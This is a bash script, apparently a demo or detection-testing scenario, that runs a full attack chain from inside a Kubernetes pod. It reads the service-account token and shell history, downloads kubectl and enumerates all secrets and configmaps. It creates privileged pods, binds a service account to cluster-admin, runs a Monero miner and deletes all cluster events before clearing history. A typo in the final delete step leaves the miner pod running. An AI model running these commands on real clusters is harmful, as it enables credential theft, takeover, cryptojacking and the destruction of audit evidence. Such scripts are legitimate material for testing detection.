#!/bin/bash

#find out what user is running
whoami

#find out if in kubernetes
#k8s environment variables
env | grep -i kube

# SA token
ls -la /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# command history
history

# network discovery
ip a

# download kubectl
curl -L https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl -o /tmp/kubectl
chmod +x /tmp/kubectl

# discover API server
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
/tmp/kubectl auth can-i --list

# try to find kubelet ip
# need to use either nmap or kubectl get nodes to find out
max=$[$(/tmp/kubectl get no -A | wc -l)-2]
for (( i=0; i<=$max; ++i ))
do
	ip_var=$(/tmp/kubectl get no -A -o=jsonpath="{.items[$i].status.addresses[0].address}")
	curl http://$ip_var:10255/pods
done

# list K8S Secrets&Configmaps
/tmp/kubectl get secrets -A
/tmp/kubectl get configmaps -A

# create new pod
/tmp/kubectl run scenario-demo-nginx --image=nginx --generator=run-pod/v1
# exec into pod 
sleep 15  # wait for pod to initiate before exec
/tmp/kubectl exec scenario-demo-nginx sleep 1
# kill pod nginx
/tmp/kubectl delete po scenario-demo-nginx

# cronjob
/tmp/kubectl create -f ./cronjob.json
# delete cronjob
/tmp/kubectl delete -f ./cronjob.json

# run privileged pod
/tmp/kubectl create -f ./privileged_pod.yaml
# remove privileged pod
/tmp/kubectl delete -f ./privileged_pod.yaml

# create ServiceAccount
/tmp/kubectl create serviceaccount scenario-demo-tester-sa

# bind tester-sa ServiceAccount to cluster-admin
/tmp/kubectl create -f ./clusterbind.json

# run pod with high permissions SA tester-sa
/tmp/kubectl create -f ./pod_priv_sa.yaml
# delete pod with high permissions SA tester-sa
/tmp/kubectl delete -f ./pod_priv_sa.yaml

# delete bind tester-sa ServiceAccount to cluster-admin
/tmp/kubectl delete -f ./clusterbind.json

# delete ServiceAccount
/tmp/kubectl delete serviceaccount scenario-demo-tester-sa

# deletion of Kubernetes Events
/tmp/kubectl delete events --all

# run miner pod
/tmp/kubectl run scenario-demo-miner --image=kannix/monero-miner --generator=run-pod/v1 
sleep 15
# kill miner pod
/tmp/kubectl delete po scenario-demo-mine

# clear command history
history -c
